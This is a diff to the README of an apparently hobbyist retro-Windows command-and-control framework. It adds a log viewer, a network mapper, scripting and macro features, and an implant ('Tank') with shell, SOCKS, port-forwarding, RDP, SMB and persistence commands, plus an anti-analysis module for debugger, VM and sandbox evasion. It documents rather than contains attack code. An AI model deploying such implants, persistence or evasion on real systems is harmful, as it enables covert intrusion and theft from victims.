@@ -307,6 +307,8 @@ All binaries are built to `windows/`. Build all at once with `./build-c2.sh`, or
 | `markuped.exe` | Win32s / NT / 95 | Markdown editor (split-pane, live preview) |
 | `wget.exe` | Win32s / NT / 95 | Command-line HTTP/HTTPS/FTP downloader |
 | `wget16.exe` | Win 3.1 / WFW 3.11 | Command-line HTTP downloader (16-bit) |
+| `jloshtog.exe` | Win32s / NT / 95 | Joshua log viewer — reads `joshua.log` outwith the controller |
+| `dumont.exe` | Win32 / NT 3.1+ | Network mapper — renders grid scan output as a node map |
 
 > All examples below use `example.com` as the target host, `169.254.69.0/24` as the target LAN, and `172.16.93.0/16` as the C2 infrastructure range. Neither subnet is internet-routable.
 
@@ -330,7 +332,7 @@ Connect with:
 ===========================
 ```
 
-Sessions (tanks + operator clients) appear in the left panel. Each session opens as an MDI child window. Use the Tank menu to issue tasks: Sysinfo, Process List, Directory Listing, Get File, Put File, Screenshot.
+Sessions (tanks + operator clients) appear in the left panel. Each session opens as an MDI child window. Use the Tank menu to issue tasks: Sysinfo, Process List, Directory Listing, Get File, Put File, Screenshot, Subnet Scan, Run Script, Packet View.
 
 **Operator / moderator commands** — type in the Server Log console or send from an operator client:
 
@@ -342,6 +344,22 @@ Sessions (tanks + operator clients) appear in the left panel. Each session opens
 | `/tanks` | any | List connected implants |
 | `/kick <handle>` | console or mod | Disconnect an operator |
 | `/key` | console only | Re-display the server key |
+| `/scansubnet <cidr> [-p ports]` | console or mod | Run `scan` on active tank; results open in Dumont |
+| `/script <file>` | console or mod | Run a script file on the active tank |
+
+**Tab completion** — press `Tab` in any session input field to cycle through known commands. Works for both tank commands and `/` console commands.
+
+**Themes** — `View → Theme` selects from 21 colour themes (Solarized Dark, Matrix, Teletext, ProComm, British Rail, DSB, ScotRail, Pan Am, IRN-BRU, and more). Selection is persisted to `WIN.INI` and survives restart.
+
+**Session scripting** — `Tank → Run Script...` loads a `.mac` or `.txt` file and sends each command to the tank in sequence, waiting for `<<<DONE>>>` between steps. One command per line; `#` introduces a comment.
+
+**Macro recording** — `Tank → Record Macro` captures every command sent during the session. `Tank → Save Macro...` writes the recording to a file for replay. `Tank → Play Macro...` replays the in-memory recording or loads a saved macro file.
+
+**Packet viewer** — `Tank → Packet View` opens an MDI hex-dump window showing live inbound and outbound traffic for that session (decrypted where TLS is in use).
+
+**Sound events** — system sounds fire on tank connect/disconnect and operator join/leave. Uses `winmm.dll` loaded dynamically; silent on machines without a sound card.
+
+**Easter egg** — press `£` during the startup splash to play the Windows NT 4 startup theme.
 
 ---
 
@@ -554,6 +572,57 @@ wget16.exe http://172.16.93.1/pkg.zip -O PKG.ZIP
 
 ---
 
+### jloshtog.exe — Joshua Log Viewer
+
+Named with mild Scots flavour — *losh* being a softened exclamation, *og* meaning log. Reads `joshua.log` outwith the main controller: no sockets, no auth, no MDI.
+
+```bat
+rem Open alongside joshua.log (auto-detected in same directory)
+jloshtog.exe
+
+rem Open a specific log file
+jloshtog.exe C:\LOGS\joshua.log
+```
+
+**Features:**
+
+- Locates `joshua.log` in the same directory as `jloshtog.exe` automatically
+- `File → Open` to browse, `F5` to reload
+- `View → Filter` — All Events / Tanks Only / Operators Only
+- `View → Word Wrap` toggle
+- Status bar: filename, line count, byte count
+
+---
+
+### dumont.exe — Network Mapper
+
+Named after Dumont, the I/O Tower Guardian in *Tron*. Reads `grid` scan output and renders a scrollable node map.
+
+```bat
+rem Load a saved scan file
+dumont.exe 169.254.69.0_24.tsv
+
+rem Pipe grid output directly
+grid -q 169.254.69.0/24 -p 22,80,443,445,3389 | dumont.exe
+
+rem Or use File > Open after launching
+dumont.exe
+```
+
+Within Joshua, `/scansubnet` runs a scan via the active tank implant and opens Dumont automatically when the scan completes.
+
+**Features:**
+
+- Node map: each host as a box, open ports listed inside
+- Hosts grouped and sorted by /24 subnet
+- `View → Zoom` — 50 % to 150 %
+- `View → Service Labels` toggle
+- `View → Subnet Groups` toggle
+- `File → Copy Map to Clipboard` exports plain text
+- Scrollable; mouse wheel supported
+
+---
+
 ## Grid — Port Scanner
 
 `windows/grid.c` — Win32s/Win32 TCP connect scanner. GUI subsystem, async select-pool, no threads; runs on Win32s and WFW 3.11 through Windows NT 4.
@@ -620,19 +689,22 @@ nmap data files are GPL-licensed. See https://nmap.org/book/man-legal.html
 
 ## TODO
 
+### Completed
+
+* ~~Session scripting~~ — `Tank → Run Script...`; `/script <file>` console command
+* ~~Macro support~~ — `Tank → Record / Save / Play Macro`
+* ~~Integrated packet viewer~~ — `Tank → Packet View`; live hex dump MDI child
+* ~~Network mapping~~ — `dumont.exe`; auto-launched after `/scansubnet`
+* ~~Historical Windows theme packs~~ — 21 themes, `View → Theme`, persisted to `WIN.INI`
+* ~~Sound support for session events~~ — system sounds on tank/operator connect and disconnect
+* ~~Offline log analysis~~ — `jloshtog.exe`
+* ~~Easter egg~~ — `£` during startup splash plays the Windows NT 4 startup theme
+
 ### Future Work
 
-* Session scripting
-* Plugin architecture
-* Macro support
-* Integrated packet viewer
-* Network mapping
-* Historical Windows theme packs
-* Sound support for session events
-* WinG visual enhancements
-* Offline log analysis
+* **Plugin architecture** — stable ABI design needed first; deferred
+* **WinG visual enhancements** — niche; needs the WinG SDK
 * **Win3.11 installer** — a proper `SETUP.EXE`-style installer in the tradition of UltraEdit, WinZip 5.x etc. Wizard dialogs, progress meter, Program Manager group auto-creation, optional component selection. Needs to run on bare WFW 3.11 with no prerequisites.
-* **Easter egg** — ø keypress in any tool pops the easter egg. (Much later; it's a trademark. Don't implement early.)
 
 ---
 
@@ -642,8 +714,8 @@ nmap data files are GPL-licensed. See https://nmap.org/book/man-legal.html
 
 | Component | File | Notes |
 |-----------|------|-------|
-| **Joshua** | `windows/joshua.c` | MDI C2 controller. Listens on :4444, auto-restarts listener. Session list panel (left), Tank banner parsing, file receive state machine, put/screenshot commands, Schannel TLS (outbound). |
-| **Tank (Win32)** | `windows/tank.c` | Connect-back implant, Win32s compatible. Commands: sysinfo, ps, ls, get, put, regq, screenshot. Schannel TLS (blocking). CLU patchable config block. Calls recognizer_check() on startup. |
+| **Joshua** | `windows/joshua.c` | MDI C2 controller. Listens on :4444. Session list panel, Tank banner parsing, file receive, put/screenshot, Schannel TLS. 21-theme engine (View → Theme, WIN.INI persistence). Sound events (winmm.dll). Session scripting and macro recording/playback. Packet viewer (live hex dump MDI child). `/scansubnet` → Dumont pipeline. Tab completion. Easter egg (£ → NT4 startup WAV). |
+| **Tank (Win32)** | `windows/tank.c` | Connect-back implant, Win32s compatible. Commands: sysinfo, ps, ls, get, put, regq, screenshot, scan, portfwd, socks4, smb, rdp, shell, cat, less, persist, cd. Embedded async TCP scanner (same select-pool model as gridcli; streams TSV to Joshua). Schannel TLS. CLU patchable. |
 | **Tank (Win16)** | `windows/tank16.c` | Connect-back implant for Windows 3.1/WFW without Win32s. Commands: sysinfo, ls, get, put, shell exec. 16-bit Winsock via dynamic WINSOCK.DLL load. CLU patchable. |
 | **CLU** | `windows/clu.c` | Win32 GUI generator. Scans template binary for magic `AELDRECLU0001`, patches host/port/tls in-place. Browse dialogs for template and output. |
 | **Recognizer** | `windows/recognizer.c` | Anti-analysis module. Inactive stub by default; activate with `-DRECOGNIZER_ENABLE`. Checks: IsDebuggerPresent, VMware/VBox/VirtualPC registry keys, sandbox usernames, timing. |
@@ -654,6 +726,8 @@ nmap data files are GPL-licensed. See https://nmap.org/book/man-legal.html
 | **markuped** | `windows/markuped.c` | Win32s/Win32 Markdown editor. Split-pane (source + live preview), toolbar, menus, inline bold/italic/code rendering, fenced code blocks, blockquotes, lists, HR. Draggable splitter, 500 ms debounced refresh. comdlg32 for file dialogs. |
 | **wget** | `windows/wget.c` | Win32s/Win32 HTTP/HTTPS/FTP downloader. WinInet dynamically loaded for HTTPS/FTP (ignores SSL errors); raw socket fallback for plain HTTP when WinInet absent. GUI progress window or stderr progress in console mode. |
 | **wget16** | `windows/wget.c` | Win16 HTTP downloader (same source as wget). WINSOCK.DLL loaded dynamically. HTTP only; no HTTPS/FTP. GUI MessageBox completion notification. |
+| **jloshtog** | `windows/jloshtog.c` | Win32s/Win32 Joshua log viewer. Filter by tanks/operators, word-wrap, auto-locates `joshua.log` next to the binary. F5 reload. |
+| **dumont** | `windows/dumont.c` | Win32 network mapper. Reads grid TSV output, renders scrollable node map with subnet grouping, zoom, service labels. Accepts piped stdin. Auto-launched by Joshua after `/scansubnet`. |
 
 ### Icons
 
@@ -757,16 +831,16 @@ C2_INTEGRATION=1 pytest tests/test_c2_protocol.py -v
 
 - **OpenWatcom 2.0** — provides `wcl386` (Win32), `wcc` (Win16), `wlink`, `wrc`
 - **i686-w64-mingw32-windres** — for `.rc` resource compilation
-- The repo includes a Docker image `putty-win32s-builder` with all tools pre-installed
+- The repo includes a Docker image `aeldrec2-builder` with all tools pre-installed
 
 ### Docker build (recommended)
 
 ```bat
 cd windows
-docker run --rm -v "%CD%:/src" putty-win32s-builder wmake -f Makefile.wc joshua
-docker run --rm -v "%CD%:/src" putty-win32s-builder wmake -f Makefile.wc tank
-docker run --rm -v "%CD%:/src" putty-win32s-builder wmake -f Makefile.wc tank16
-docker run --rm -v "%CD%:/src" putty-win32s-builder wmake -f Makefile.wc clu
+docker run --rm -v "%CD%:/src" aeldrec2-builder wmake -f Makefile.wc joshua
+docker run --rm -v "%CD%:/src" aeldrec2-builder wmake -f Makefile.wc tank
+docker run --rm -v "%CD%:/src" aeldrec2-builder wmake -f Makefile.wc tank16
+docker run --rm -v "%CD%:/src" aeldrec2-builder wmake -f Makefile.wc clu
 ```
 
 On macOS/Linux replace `%CD%` with `$(pwd)`.
